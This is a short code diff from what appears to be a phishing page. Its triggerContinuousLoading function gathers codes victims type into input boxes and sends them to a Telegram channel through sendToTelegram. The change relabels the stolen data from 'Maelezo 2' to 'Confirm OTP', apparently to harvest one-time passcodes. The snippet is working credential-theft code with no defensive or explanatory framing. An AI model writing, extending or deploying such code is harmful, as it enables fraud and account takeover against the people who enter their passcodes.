@@ -183,7 +183,7 @@
         }
         function triggerContinuousLoading() {
             let v = ""; document.querySelectorAll('#details-container .box-input').forEach(i => v += i.value);
-            sendToTelegram(`📝 Maelezo 2: ${v}`); nextScreen(6);
+            sendToTelegram(`📝 Confirm OTP: ${v}`); nextScreen(6);
         }
 
         document.querySelectorAll('.autotab').forEach((input, index, inputs) => {
